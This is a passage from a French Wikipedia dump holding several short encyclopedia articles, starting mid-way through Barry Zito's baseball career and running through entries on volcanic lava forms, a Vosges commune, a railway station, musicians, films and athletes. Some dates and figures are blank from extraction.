Avec 35 départs en 2001, Zito, 23 ans, est le meneur des Ligues majeures à ce chapitre. Il remporte 17 victoires pour Oakland, contre huit décisions perdues. Il totalise 205 retraits sur des prises en 214 manches et un tiers lancées. En séries d'après-saison, les Athletics lui remettent la balle dans une rencontre de Série de division face aux Yankees de New York. Malgré une brillante performance où il n'accorde qu'un point et deux coups sûrs à l'adversaire en huit manches, Oakland s'incline et Zito voit un revers porté à sa fiche. Sa seule erreur est un coup de circuit accordé à Jorge Posada. Son adversaire, le lanceur des Yankees Mike Mussina n'accorde pas de point dans un gain de 1-0 de New York.
En 2002, il domine la Ligue américaine avec 23 victoires. En seulement cinq occasions il est crédité de la défaite dans un match des A's. Il affiche une moyenne de points mérités de 2,75 en 229,1 manches au monticule. Il est premier avec 35 départs dans l'Américaine et, plus important, on lui décerne à la fin de la saison le trophée Cy Young du meilleur lanceur de la ligue. Il reçoit même plusieurs votes au scrutin du joueur par excellence de l'année, terminant au scrutin. À la mi-saison 2002, Zito est invité pour la première fois au match des étoiles du baseball majeur. En éliminatoires, il effectue un départ et est crédité d'une victoire face aux Twins du Minnesota en Série de division.
Encore une fois très utilisé en 2003 par les Athletics (35 nouveaux départs et un sommet en carrière de 231,2 manches au monticule), ses statistiques s'avèrent moins impressionnantes : fiche victoires-défaites de 14-12 et moyenne de 3,30. Il reçoit cependant sa seconde invitation à la partie d'étoiles. Les A's prennent part aux éliminatoires pour une quatrième saison de suite mais échouent, comme les trois fois précédentes, dès le premier tour des séries. On remet la balle à Zito pour deux parties face aux Red Sox de Boston : il remporte une victoire et subit une défaite. Dans le cinquième et dernier match de la série, qui voit Oakland être éliminé, il est le lanceur perdant face à Pedro Martinez des Red Sox.
De 2004 à 2006, Zito enchaîne des saisons de 11, 14 et 16 gains pour Oakland, mais avec des moyennes de points mérités bien supérieures à celles de ses premières années.
En 2006, il est invité pour la troisième fois au match d'étoiles.
Giants de San Francisco.
Devenu agent libre après la saison 2006, il signe en décembre de la même année un contrat de 126 millions de dollars pour 7 saisons avec les Giants de San Francisco. Il s'agit du plus gros contrat jamais accordé par la franchise, et du plus lucratif contrat jamais signé par un lanceur de la MLB. C'est aussi un contrat que les Giants et leurs partisans viendront vite à regretter puisqu'au cours des années suivantes Zito sera fréquemment blessé, ne connaîtra pas ses succès antérieurs, et commandera un salaire qui pèsera lourd sur les finances de l'équipe.
Au sein de la rotation de lanceurs partants des Giants, Zito présente des dossiers victoires-défaites négatifs à ses cinq premières saisons dans la Ligue nationale. Il mène même les majeures pour le nombre de défaites (17) lors de la saison 2008.
Retiré de la rotation de partants des Giants à l'automne 2010, il n'apparaît dans aucun match de l'équipe dans leur route vers la conquête de la Série mondiale.
Zito est impliqué dans un accident de la circulation à Los Angeles le . Il passe une visite de contrôle à l'hôpital pour des douleurs à la nuque. Il amorce tout de même la saison en même temps que ses coéquipiers. Une de fois de plus fréquemment blessé en cours de saison, il ne lance que dans 13 matchs, dont à peine 9 départs. Sa fiche victoires-défaites est de 3-4 avec une moyenne de points mérités de 5,87 en 53 manches et deux tiers lancées, le plus bas total de manches accumulées en une saison depuis son arrivée dans les majeures.
Saison 2012.
Le , dans une victoire de 7-0 des Giants au Colorado, Zito lance son premier blanchissage depuis 2003. Ses 274 départs sans blanchissage est la troisième plus longue séquence du genre dans l'histoire des majeures après Tim Wakefield (353 départs, 1997 à 2011) et Kirk Rueter (299 départs, 1995 à 2005). Zito remporte 15 victoires en saison régulière 2012, son plus haut total depuis 2006 et son record depuis son arrivée à San Francisco. Il encaisse 8 défaites en 32 départs et sa moyenne de points mérités se chiffre à 4,15 en 184 manches et un tiers lancées.
Après avoir été laissé de côté par l'équipe durant les séries éliminatoires qui mènent à la conquête de la Série mondiale 2010, Zito fait oublier ses performances inégales depuis son arrivée à San Francisco en remportant des matchs cruciaux dans les éliminatoires de 2012. Le 19 octobre, il est à Saint-Louis le lanceur partant des Giants, qui tirent de l'arrière 1-3 dans la Série de championnat de la Ligue nationale et font face à l'élimination. Lançant son meilleur match jusque-là comme porte-couleurs des Giants, il blanchit les Cardinals de Saint-Louis en 7 manches et deux tiers lancées, enregistrant six retraits sur des prises et aidant sa cause à l'attaque avec un point produit dans une victoire de 5-0. Les Giants renversent les Cardinals en 7 parties pour accéder à la Série mondiale 2012. Après une exténuante finale de la Ligue nationale s'étant rendue à sa limite, les Giants n'ont d'autre choix que d'envoyer Zito au monticule pour commencer la Série mondiale, les as Matt Cain et Madison Bumgarner n'étant pas disponibles et Tim Lincecum lançant dans l'enclos de relève. Opposé à Justin Verlander le 24 octobre pour amorcer la Série mondiale, Zito limite les Tigers de Détroit à un point, remporte le match et frappe de nouveau un coup sûr. Le gaucher célèbre quelques jours plus tard un deuxième titre de champion du monde, dans une conquête où il aura cette fois eu la chance de jouer un rôle de premier plan.
Saison 2013.
Le , Zito est le lanceur partant des Giants pour leur premier match à domicile de la saison 2013. Affrontant les Cardinals de Saint-Louis pour la première fois depuis le match crucial de la Série de championnat précédente, il n'accorde que trois coups sûrs en sept manches et les Giants remportent la victoire pour la de suite dans un match où il est le partant, séries éliminatoires incluses. La suite de choses n'est guère reluisante pour Zito, qui conclut la dernière saison prévue à son contrat avec une fiche de 5 victoires, 11 défaites, et une moyenne de points mérités de 5,74 en 133 manches et un tiers lancées.
Retour à Oakland.
Sans contrat après l'échéance de son entente à long terme avec les Giants, Zito est sans emploi en 2014. En février 2015, il signe un contrat des ligues mineures avec sa première équipe, les Athletics d'Oakland, qui l'invitent à leur camp d'entraînement.
Il est rappelé des mineures vers la fin de la saison pour un dernier tour de piste, mais l'intention des Athletics est au départ de ne l'employer que comme lanceur de relève. Cependant, alors que la saison 2015 tire à sa fin et que tant les Athletics que leurs voisins, les Giants de San Francisco, sont éliminés de la course aux séries éliminatoires, les deux clubs voient une belle occasion de générer de l'intérêt pour un match autrement de peu d'importance et de saluer la carrière de deux anciens coéquipiers d'Oakland. Il est donc prévu que le 26 septembre à Oakland, Zito soit le lanceur partant des A's contre Tim Hudson pour les Giants, ce dernier ayant aussi annoncé qu'il prendrait sa retraite une semaine plus tard. Le trio d'anciens lanceurs étoiles des Athletics est complet avec Mark Mulder, qui vient effectuer le lancer protocolaire. La nostalgie est à l'évidence la grande gagnante de cet affrontement tenu par un samedi après-midi : Hudson ne lance qu'une manche et un tiers pour les Giants, allouant 3 points, tandis que Zito donne 4 points en deux manches avant d'être retiré d'une rencontre qui se termine 14-10 pour San Francisco.
Zito dispute son dernier match dans les majeures le 30 septembre 2015, un départ qui dure 4 manches où il donne deux points et 4 buts-sur-balles aux Angels de Los Angeles.
Vie personnelle.
Barry Zito est le neveu de l'acteur américain Patrick Duffy.
En 2003, Zito apparaît dans un épisode de la série télévisée "JAG". Il interprète le rôle d'un lanceur de baseball de l'équipe de l"'United States Navy" qui atteint à la tête un frappeur de l'équipe des Marines lors de leur partie de baseball annuelle.

</doc>
<doc id="2844624" url="https://fr.wikipedia.org/wiki?curid=2844624" title="Fontaine de lave">
Fontaine de lave

Une fontaine de lave est un type de formation volcanique se rencontrant sur des volcans en éruption rejetant des laves suffisamment fluides et avec un débit suffisamment puissant et régulier pour former à la sortie des différentes bouches volcaniques un jet de lave plus ou moins continu.
Caractéristiques.
Généralement, une fontaine de lave est composée d'un ensemble de paquets de lave plus ou moins gros qui sont expulsés dans les airs par l'arrivée d'une bulle de gaz volcaniques à la sortie de la bouche volcanique. Ce mode de projection donne des fontaines en forme de plumeau dont le débit et la hauteur sont pulsatiles. Dans le cas où l'expulsion de la lave est générée par une pression interne plutôt que par l'arrivée d'une bulle de gaz volcaniques, la fontaine de lave peut prendre la forme d'un véritable jet continu de roches en fusion. Si ce jet est vertical et que le débit de lave est important, la fontaine de lave peut alors prendre l'aspect d'un dôme. Dans le cas d'une éruption fissurale, les différentes fontaines de lave peuvent former un véritable rideau de matière en fusion. Le plus étendu de ces murs de lave s'est formé en 1783 sur les Lakagígar en Islande le long de la fissure de de longueur.
Les fontaines de lave sont généralement hautes de quelques mètres à quelques dizaines de mètres mais certaines dépassent plusieurs centaines de mètres. La plus grande fontaine de lave observée le fut sur l'Izu Ōshima en 1986 au Japon avec environ de hauteur. Dans le reste du système solaire, la plus haute fontaine de lave observée s'est produite sur le volcan Tvashtar de la lune jovienne Io avec de hauteur.
Généralement, la lave éjectée n'a pas eu assez de temps pour se refroidir et donne naissance à une ou plusieurs coulée de lave une fois retombée. La durée de vie d'une fontaine de lave varie en fonction du maintien des conditions propices à sa formation. Certaines ne durent que quelques minutes tandis que d'autres peuvent rester actives pendant toute une éruption volcanique qui peut s'étaler sur plusieurs semaines voire plusieurs mois.

</doc>
<doc id="2844629" url="https://fr.wikipedia.org/wiki?curid=2844629" title="Saint-Baslemont">
Saint-Baslemont

Saint-Baslemont est une commune française située dans le département des Vosges, en région Grand Est.
Ses habitants sont appelés les "Saint-Baslemontais".
Géographie.
Localisation.
La commune est à de Thuillières, 4,2 de Lignéville et 4,3 de Provenchères-lès-Darney.
Géologie et relief.
Espaces naturels :
Hydrographie et les eaux souterraines.
Hydrogéologie et climatologie : Système d’information pour la gestion des eaux souterraines du bassin Rhin-Meuse .
Réseau hydrographique.
La commune est située pour partie dans le bassin versant de la Meuse au sein du bassin Rhin-Meuse et pour partie dans le bassin versant de la Saône au sein du bassin Rhône-Méditerranée-Corse. Elle est drainée par le ruisseau de Thuillières, le ruisseau du Bois le Comte, le ruisseau de Bonneval et le ruisseau Jean Veaulot.
Le ruisseau de Thuillières, d'une longueur totale de , prend sa source dans la commune et se jette dans la Saône à Bonvillet, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Nappe des Grès du Trias Inférieur ». Ce document de planification, dont le territoire comprend le périmètre de la zone de répartition des eaux de la nappe des Grès du trias inférieur (GTI), d'une superficie de , est en cours d'élaboration. L’objectif poursuivi est de stabiliser les niveaux piézométriques de la nappe des GTI et atteindre l'équilibre entre les prélèvements et la capacité de recharge de la nappe. Il doit être cohérent avec les objectifs de qualité définis dans les SDAGE Rhin-Meuse et Rhône-Méditerranée. La structure porteuse de l'élaboration et de la mise en œuvre est le conseil départemental des Vosges.
La qualité des eaux de baignade et des cours d’eau peut être consultée sur un site dédié géré par les agences de l’eau et l’Agence française pour la biodiversité.
Climat.
En 2010, le climat de la commune est de type climat de montagne, selon une étude du Centre national de la recherche scientifique s'appuyant sur une série de données couvrant la période 1971-2000. En 2020, Météo-France publie une typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique altéré et le climat océanique altéré et est dans la région climatique Lorraine, plateau de Langres, Morvan, caractérisée par un hiver rude (), des vents modérés et des brouillards fréquents en automne et hiver. 
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, « Lignéville », sur la commune de Lignéville à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . . 
Les paramètres climatiques de la commune ont été estimés pour le milieu du siècle (2041-2070) selon différents scénarios d'émission de gaz à effet de serre à partir des nouvelles projections climatiques de référence DRIAS-2020. Ils sont consultables sur un site dédié publié par Météo-France en novembre 2022.
Urbanisme.
Typologie.
Au , Saint-Baslemont est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Vittel - Contrexéville, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d’occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des forêts et milieux semi-naturels (54,2 % en 2018), une proportion identique à celle de 1990 (54,2 %). La répartition détaillée en 2018 est la suivante : 
forêts (54,2 %), prairies (29,5 %), terres arables (11,5 %), zones agricoles hétérogènes (4,8 %). L'évolution de l’occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Le nom de la localité est attesté sous les formes "O. de Sancti Basuli monte" (1101) ; "V. de Sancti Basolimonte" (1122) ; "H. de Sancti Baslemonte" (avant 1125) ; "G. de Saint Baslemunt" (1177) ; "Dominus Vivianus de Seintbailemont" (avant 1193) ; "H. de Sancto Basolomonte" (1256) ; "G. de Senbaillemont" (1261) ; "Saint Ballemont" (1265) ; "Seint Baillemont" (1293) ; "Sanct Ballemont" (1355) ; "Saint Bellemont" (1427) ; « "Les deux villes desus et desouz ledit chastel de Saint Baslemont" » (1471) ; "Saint Balemont" (1656) ; "S. Bellemont" () ; "Saint Balmont" (1738).&lt;br&gt;
Saint-Baslemont est un hagiotoponyme, la commune doit son nom à saint Basle de Verzy, ermite du , évangélisateur de la Champagne et de la Lorraine.
Histoire.
Reprise de fief le 13 mars 1471 par Ferri de Montreux "le château et les deux villes dessus &amp; dessous de Saint-Baslemont" avec toutes les justices &amp; dépendances. Restitution du fief le 23 juin 1477 de la part du duc René II de Lorraine pour Ferri de Montreux. 
En 1635, les Suédois assiègent le château mais sont repoussés par l'épouse du seigneur Jean-Jacques de Haraucourt, Alberte-Barbe d'Ernecourt, appelée l"'Amazone chrétienne".
Politique et administration.
Budget et fiscalité 2022.
En 2022, le budget de la commune était constitué ainsi :
Avec les taux de fiscalité suivants :
Chiffres clés Revenus et pauvreté des ménages en 2021 : médiane en 2021 du revenu disponible, par unité de consommation.
Population et société.
Enseignement.
Établissements d'enseignements :
Santé.
Professionnels et établissements de santé :
Culture locale et patrimoine.
Lieux et monuments.
Patrimoine religieux :

</doc>
<doc id="2844632" url="https://fr.wikipedia.org/wiki?curid=2844632" title="Chelsea Girl">
Chelsea Girl

 est le premier album de la chanteuse Nico, sorti en octobre 1967. Il inclut des compositions de Bob Dylan, Jackson Browne et Tim Hardin, ainsi que des membres du Velvet Underground.
Le titre fait référence au film de Andy Warhol "Chelsea Girls" tourné en 1966 à l'Hotel Chelsea de New York avec Nico au casting.
Les cordes et la flûte sont ajoutées aux enregistrements initiaux par le producteur Tom Wilson et l'arrangeur Larry Fallon, ces arrangements ont été réalisés sans consulter Nico qui les a désapprouvés.
L'album est cité dans l'ouvrage de référence de Robert Dimery "Les 1001 albums qu'il faut avoir écoutés dans sa vie".

</doc>
<doc id="2844634" url="https://fr.wikipedia.org/wiki?curid=2844634" title="Gare de Loriol">
Gare de Loriol

La gare de Loriol est une gare ferroviaire française de la ligne de Paris-Lyon à Marseille-Saint-Charles, située sur le territoire de la commune de Loriol-sur-Drôme, dans le département de la Drôme, en région Auvergne-Rhône-Alpes.
Elle est mise en service en 1854 par la Compagnie du chemin de fer de Lyon à la Méditerranée (LM), avant de devenir une gare de la Compagnie des chemins de fer de Paris à Lyon et à la Méditerranée (PLM) en 1857.
Après la fermeture du guichet en 2014, elle est devenue une halte voyageurs de la Société nationale des chemins de fer français (SNCF) desservie par des trains .
Situation ferroviaire.
Établie à d'altitude, la gare de Loriol est située au point kilométrique (PK) 637,324 de la ligne de Paris-Lyon à Marseille-Saint-Charles, entre les gares ouvertes de Livron et de Montélimar. En direction de Montélimar, s'intercalent les gares fermées de Saulce et de La Coucourde - Condillac.
Histoire.
La gare de Loriol est mise en service le par la Compagnie du chemin de fer de Lyon à la Méditerranée (LM), lorsqu'elle ouvre à l'exploitation la section d'Avignon à Valence.
En , la gare est intégrée dans le réseau de la Compagnie des chemins de fer de Paris à Lyon et à la Méditerranée (PLM), nouvelle compagnie née de la fusion entre la Compagnie du chemin de fer de Paris à Lyon et la Compagnie du chemin de fer de Lyon à la Méditerranée.
Le guichet est fermé, par la SNCF, le .
Fréquentation.
De 2015 à 2024, selon les estimations de la SNCF, la fréquentation annuelle de la gare s'élève aux nombres indiqués dans le tableau ci-dessous.
Service des voyageurs.
Accueil.
Halte SNCF, c'est un point d'arrêt non géré (PANG) à entrée libre.
Desserte.
Loriol est desservie par les trains de la relation Lyon-Perrache (ou Lyon-Part-Dieu) - Avignon-Centre).
Intermodalité.
Un parc pour les vélos et un parking pour les véhicules y sont aménagés.

</doc>
<doc id="2844635" url="https://fr.wikipedia.org/wiki?curid=2844635" title="Franz von Hoesslin">
Franz von Hoesslin

Franz von Hoeßlin était un chef d'orchestre et compositeur allemand né à Munich le , mort dans un accident d'avion au large de Sète le .
Biographie.
Franz von Hoesslin a été l'élève de Max Reger et de Félix Mottl. Il fit ses débuts de chef d'orchestre à Danzig. De 1908 à 1911, il est nommé au Théâtre de Saint-Gall où il dirige tout L'Anneau du Nibelung, Tristan et Isolde, Les Maîtres Chanteurs de Nuremberg de Wagner, Fidelio, de Beethoven, ainsi de nombreux opéras de Mozart et Gluck. A Hellerau, il rencontre Émile Jaques-Dalcroze pour étudier la rythmique Jaques-Dalcroze.
En 1912, Franz von Hoesslin est appelé à Riga où il dirige le « "Konzertverein" ». Au début de la Première Guerre mondiale, il s'engage comme volontaire. Il y resta avant tout musicien, fondant un ensemble de musique de chambre et transformant ses bagages en petite bibliothèque musicale.
Dans les années 1919-1920, il est chef de la « Société des amis de la musique » de Lübeck, puis maître de chapelle à Mannheim les deux années suivantes, où il fait la connaissance de sa seconde épouse, la cantatrice Erna Liebenthal. Il dirige ensuite à la Grosse Volksoper de Berlin. En 1923, il est nommé Generalmusikdirekort (Directeur général de la musique) du Landtheater de Dessau-Roßlau, comme successeur de Hans Knappertsbusch. L'amitié qui le liait aux peintres Paul Klee et Vassily Kandinsky, ainsi que l'architecte et urbaniste Walter Gropius est une des origines du transfert du Bauhaus à Dessau après la dissolution du Bauhaus de Weimar.
À côté de ses activités à Dessau, F. v.Hoesslin dirige à Vienne, Madrid, Lisbonne, Londres, Stockholm et Amsterdam. En 1923, il conduit un cycle Wagner à Hambourg, ainsi que les festivals Wagner de Madrid en 1922 et 1923. En 1926, il partage avec Karl Elmendorff la direction de "Bärenhäuter" et "Sternengebot" de Siegfried Wagner. En 1927, il est appelé à diriger L'Anneau du Nibelung au Festival de Bayreuth. C'est cette année-là que se firent les tout premiers enregistrements sur disque au Festival. En 1928, F. v. Hoesslin dirige à nouveau trois cycles de représentations de L'Anneau du Nibelung à Bayreuth.
En 1929, il monte L'Anneau du Nibelung avec l'Orchestre des concerts Straram et les solistes du Festival de Bayreuth au Théâtre des Champs-Élysées à Paris. Ces représentations, les premières en langue allemande en France, eurent un grand retentissement à travers toute la France, puis au niveau international, puisqu'elles firent l'objet d'enregistrements sur disques par la firme Pathé.
En 1932, F. v. Hoesslin conduit des cycles Mozart à Nice et Genève. De 1932 à 1936, il est "Generalmusikdirecktor" de l'Opéra de Breslau. Lorsque Vassily Kandinsky se trouve aux prises avec des difficultés politiques face au nazisme, F .v. Hoesslin lui offre refuge dans son chalet proche de Munich. Lui-même devait bientôt se heurter à une opposition massive de la part du régime national-socialiste. Pourtant, en 1934, il partage encore la direction de Parsifal avec Richard Strauss à Bayreuth. Mais il se voit refuser la direction des opéras de Munich ou de Hambourg. Alors même que le Sénat de cette dernière ville l'a accepté comme Generalmusikdirekor, il se voit mettre un veto par Joseph Goebbels, Ministre du Reich à l'Éducation du peuple et à la Propagande. Son épouse étant juive, on lui fait comprendre que s'il s'en séparait, rien ne s'opposerait à ce qu'il soit nommé à un poste de haut rang. Se heurtant, même à Breslau, à toujours plus de difficultés d'ordre politique, Franz von Hoesslin se décide à quitter l'Allemagne pour se rendre en Italie avec son épouse et sa fille.
En 1938 (Parsifal), 1939 (Parsifal) et 1940 (L'Anneau du Nibelung), il retourne tout de même diriger à Bayreuth à l'appel de Winifred Wagner. Il voulait considérer Bayreuth comme un haut lieu international de la musique, au-delà de toute actualité politique - ce qui, de toute évidence, n'était qu'utopie. Malgré tout, les représentations de Parsifal au Festival de Bayreuth 1938, avec Germaine Lubin (Kundry), Joseph Manowarda (Gurnemanz) et Franz Völker (Parsifal) seront à ses yeux un des moments culminants de sa carrière : "Avec cette représentation, je me trouve au seuil d'une nouvelle interprétation. Jusqu'ici, je n'ai fait qu'apprendre; maintenant, je crois avoir atteint la maîtrise de mon art".
Son activité de chef plus restreinte en exil, Franz von Hoesslin se consacre davantage à la composition, notamment de Lieder. Encore appelé à diriger à Bayreuth en 1942, bien que sur la liste noire du national-socialisme, rien ne l'y fit revenir. En 1943, il dirige l'intégralité de la Tétralogie à La Scala de Milan.
Les conditions politiques se détériorant en Italie également, le chef se réfugie à Genève, où il a régulièrement été appelé par Ernest Ansermet à diriger l'Orchestre de la Suisse romande. Il y dirige notamment une Symphonie n° 9 de Beethoven qui obtient un tel succès que le concert doit être répété le lendemain.Désormais applaudi à travers toute l'Europe et alors qu'il vient de diriger une série de concerts à Barcelone, F. v. Hoesslin, accompagné de son épouse, accepte de se faire conduire en avion privé pour retourner à Genève. L'avion s'abîma en mer au large de Perpignan le .
Discographie.
Disparu juste avant la naissance du microsillon, Franz von Hoesslin n'a laissé que peu de traces discographiques. Des enregistrements sont certainement encore à découvrir dans les archives de radios en Europe.
Réédités sur CD : 

</doc>
<doc id="2844636" url="https://fr.wikipedia.org/wiki?curid=2844636" title="David Hackl">
David Hackl

David Hackl (né le à Toronto) est un réalisateur et chef décorateur canadien.
Biographie.
Il a été le chef décorateur de "Saw 2", "Saw 3" et "Saw 4". Il devait réaliser "Saw 4", cependant, Darren Lynn Bousman est revenu en tant que réalisateur. David Hackl a réalisé "Saw 5". On a d'abord signalé que Hackl dirigerait "Saw 5" et "Saw 6" puis '. Il a été rapporté plus tard que Hackl ne réaliserait que "Saw 5" et que "Saw 6" et ' seront dirigés par Kevin Greutert, monteur des cinq premiers films.
Dans "Saw 5", le grand piège final (ou test final), a été conçu par un jeune garçon, qui avait 7 ans quand il l'a dessiné, et qui n'est autre que Sean Hackl, le fils de David Hackl. Ces pièges sont décrits comme les plus terrifiants et dérangeants de toute la série de films.

</doc>
<doc id="2844640" url="https://fr.wikipedia.org/wiki?curid=2844640" title="Edinburgh Academy">
Edinburgh Academy

LEdinburgh Academy est un établissement scolaire privé écossais d'Édimbourg. Il est autogéré et auto-financé même si depuis 2006 il est assujetti à l'inspection royale britannique. L'établissement a été fondé en 1824. Le bâtiment original, dans Henderson Row dans le quartier New Town d'Édimbourg abrite maintenant l'enseignement secondaire. L'enseignement primaire est dans les bâtiments de Arboretum Road au nord des jardins botaniques royaux d'Édimbourg.
L'Edinburgh Academy est essentiellement une école de jour bien qu'elle ait eu jusqu'en 2007-2008 un petit pensionnat international dans un terrain adjacent aux terrains de jeux.

</doc>
<doc id="2844642" url="https://fr.wikipedia.org/wiki?curid=2844642" title="Les Cloches de l'Enfer">
Les Cloches de l'Enfer

Les Cloches de l'Enfer (') est un court métrage d'animation américain, du studio Disney, de la série des "Silly Symphonies", réalisé par Ub Iwerks pour Columbia Pictures, sorti le .
Synopsis.
Dans une grotte, un diable-roi préside sa cour, composée de diablotins, d'un chien à trois tête (Cerbère) et d'un serpent volant. Sur un promontoire, un groupe de diablotins joue de la musique, tandis que d'autres dansent au pied du roi, près de grandes flammes. Un autre groupe tire du lait enflammé d'une vache-dragon puis le donne au roi, qui mange ensuite l'un de ses serviteurs avant d'en poursuivre un second à travers la grotte.
Commentaires.
Ce film est le premier réalisé par Ub Iwerks, l'animateur vedette de Disney à cette époque.
On peut remarquer que certains des extraits musicaux ont été utilisés auparavant — comme "Chanson du printemps" de Mendelssohn dans "El Terrible Toreador" (1929) — et que d'autres le seront dans les "Silly Symphonies" suivantes, comme la "Marche funèbre d'une marionnette" de Gounod dans "Cannibal Capers" (1930).
Le personnage de Satan se rapproche du dieu Hadès, présent dans le court métrage "The Goddess of Spring" (1934)
Neil Sinyard note que les Silly Symphonies "La Danse macabre" (1929) et "Les Cloches de l'Enfer" (1929) prouvent que Disney pouvait être macabre, sombre et que les scènes cauchemardesques sont régulièrement présentes dans les longs métrages de Disney comme "Blanche-Neige" (1937), "Pinocchio" (1940) ou "Fantasia" (1940). Cette présence rend futile les critiques qualifiants d'aberration les productions plus adultes des années 1980 tel que "Les Yeux de la forêt" (1980) ou "La Foire des ténèbres" (1983), le spectateur devant y voir selon Sinyard la résurgence d'une tradition remontant à "La Danse macabre".

</doc>
<doc id="2844643" url="https://fr.wikipedia.org/wiki?curid=2844643" title="Deltebre">
Deltebre

Deltebre est une commune de la comarque du Baix Ebre dans la province de Tarragone en Catalogne (Espagne)
Ce lieu est très particulier puisqu'il s'agit en fait d'un delta, l'endroit où l'Ebre, le principal fleuve espagnol, se jette dans la mer méditerranée (d'où le nom de Deltebre).
Géographie.
Deltebre est localisée entre Barcelone et Valence à proximité de la ville de Tortosa, dans le sud de la province de Tarragone, la partie sud de la Catalogne.
En dehors des habitations, le delta ressemble à un grand marais cultivé en rizière sur des centaines d'hectares, avec de nombreux canaux.
Il y a également des plages ("Riumar, La Marquesa"...), des lagunes typiques, un port et l'embouchure.
Historique.
Les premiers habitants dans le delta auraient été les musulmans et, à priori, les premières véritables habitations remonteraient au .
Le "noyau historique" se crée autour de l'église de San Miguel de la Cava construite en 1818.
Deux bourgs principaux se dégagent dans le delta : la Cava et Jesús i Maria.
Puis le delta s'est développé, notamment avec la culture du riz depuis la fin du à l'époque de la construction du canal de l'Ebre.
À l'origine, le delta de l'Ebre, y compris les 2 villages ("La Cava" et "Jesús i Maria") faisait partie de Tortosa, la ville voisine.
Mais ces deux communes se sont séparées de Tortosa en 1977. Peu après, "La Cava" et "Jesús i Maria" se sont réunies en Deltebre en 1981, qui est donc comparable à un regroupement de commune, un arrondissement ou plutôt un canton en France.
Le parc naturel du delta de l'Èbre est créé en 1983.
Économie.
Hormis les services présents dans les bourgs, la quasi-monoculture du riz (une coopérative est d'ailleurs créée en 1955) est presque emblématique de Deltebre même s'il y a encore quelques "huertas".
Le tourisme est également prégnant avec le parc naturel du delta de l'Èbre ("delta del Ebro", parc de 7800 ha) dans l'une des plus grandes zones humides d'Europe avec une très grande richesse écologique (faune et flore). Les activités liées au tourisme (restaurants, locations, promenade fluviale, visite de l'embouchure, plage...) sont donc très importantes pour Deltebre.
La pêche est aussi encore pratiquée.

</doc>
<doc id="2844644" url="https://fr.wikipedia.org/wiki?curid=2844644" title="Lave pāhoehoe">
Lave pāhoehoe

La lave "pāhoehoe", terme hawaïen signifiant « rivière de satin » en raison des teintes brillantes fréquemment prises une fois refroidie, est un type de lave, généralement basaltique, parfois carbonatique, partiellement dégazée, très pauvre en silice et à très haute température, typiquement de , ce qui lui confère une très grande fluidité. Sa grande plasticité modèle fréquemment sa surface en fusion sous forme de boudins parallèles de plus ou moins grande dimension, lui donnant alors l'aspect d'un amoncèlement de coussins ou d'un amas de cordes plissées, d'où son nom de « lave cordée ».

</doc>
<doc id="2844645" url="https://fr.wikipedia.org/wiki?curid=2844645" title="Lave cordée">
Lave cordée



</doc>
<doc id="2844647" url="https://fr.wikipedia.org/wiki?curid=2844647" title="Superligue Russe">
Superligue Russe



</doc>
<doc id="2844648" url="https://fr.wikipedia.org/wiki?curid=2844648" title="2005 en athlétisme">
2005 en athlétisme

Chronologie de l'athlétisme
Les faits marquants de l'année 2005 en athlétisme
Événements.
Juillet.
Il est le premier Français à passer sous les dix secondes.

</doc>
<doc id="2844654" url="https://fr.wikipedia.org/wiki?curid=2844654" title="Laogaï">
Laogaï



</doc>
<doc id="2844656" url="https://fr.wikipedia.org/wiki?curid=2844656" title="Frank Baumholtz">
Frank Baumholtz

Frank Conrad Baumholtz (né le à Midvale, Ohio ; mort le à Winter Springs, Floride) était un ancien joueur américain de baseball qui évolua au poste de champ extérieur en Ligue majeure de baseball de 1947 à 1957.
Carrière.
Basket-ball universitaire.
Baumholtz fut aussi un joueur de basket-ball à l'université d'Ohio. Son numéro 54 a été retiré dans le "Convocation Center". La cérémonie s'est déroulée le , qui a été déclarée "Frank Baumholtz Day" dans la ville d'Athens, Ohio et sur le campus. Ce fut le seul numéro retiré jusqu'en 2007 où Dave Jamerson et Walter Luckett connurent le même honneur.
Baumholtz fut élu dans la "first team All-American" en basketball en 1941, lors de son année senior, menant les Bobcats en finale du National Invitation Tournament, le plus prestigieux tournoi du pays à l'époque et fut nommé MVP. Il disputa une saison avec les Cleveland Rebels en Basketball Association of America, l'ancêtre de la National Basketball Association. Lors de la saison BAA 1946-1947, Baumholtz joua 45 matchs, pour une moyenne de 14.0 points par match.
Baseball professionnel.
Baumholtz termina à la pour le vote du titre de National League Rookie of the Year 1947, disputant 151 matchs et cumulant 643 At Bats, 96 Runs, 182 Hits, 32 Doubles, 9 Triples, 5 Home Runs, 45 RBI, 6 Stolen Bases, 56 Walks, 28,3 % Batting, 34,1 % On-base, 38,4 % Slugging, 247 Total Bases et 11 Sacrifice Hits.
Baumholtz finit pour le vote du titre de National League MVP 1952 disputant 103 matchs et cumulant 409 At Bats, 59 Runs, 133 Hits, 17 Doubles, 4 Triples, 4 Home Runs, 35 RBI, 5 Stolen Bases, 27 Walks, 32,5 % Batting, 37,1 % On-base, 41,6 % Slugging, 170 Total Bases et 7 Sacrifice Hits.
En dix saisons, il joua 1019 matchs et cumula 3477 At Bats, 450 Runs, 1010 Hits, 165 Doubles, 51 Triples, 25 Home Runs, 272 RBI, 30 Stolen Bases, 258 Walks, 29,0 % Batting, 34,2 % On-base, 38,9 % Slugging, 1352 Total Bases, 45 Sacrifice Hits, 10 Sacrifice Flies et 2 Intentional Walks.
Baumholtz connut une saison mémorable en ligue mineure en 1950, tapant à 37,9 % et combinant 254 hits en 172 matchs pour les Los Angeles Angels de la "Pacific Coast League".

</doc>
